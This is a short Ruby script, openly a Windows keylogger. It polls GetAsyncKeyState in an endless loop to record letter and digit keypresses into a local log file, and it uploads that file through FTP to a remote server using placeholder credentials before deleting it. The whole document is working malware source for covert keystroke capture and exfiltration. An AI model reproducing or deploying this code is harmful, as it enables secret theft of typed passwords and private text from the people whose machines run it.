#!usr/bin/ruby

require 'net/ftp'
require 'open-uri'
require 'Win32API'
 
Net::FTP.open('ftp server', 'ftp username', 'ftp password') do |ftp|
  ftp.passive = true
  ftp.putbinaryfile("log.txt")
end

def reseter
  File.delete("log.txt")
end

reseter

def savefile(filename,text)
files = File.open(filename,'a')
files.puts text+"\n"
end
 
def capturar
 
nave = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
 
while 1
 
for num1 in (0x30..0x39)
if nave.call(num1) & 0x01 == 1 
savefile("log.txt",num1.chr())
end
end
 
for num2 in (0x41..0x5A)
if nave.call(num2) & 0x01 == 1 
savefile("log.txt",num2.chr())
end
end
end
end
 
capturar()
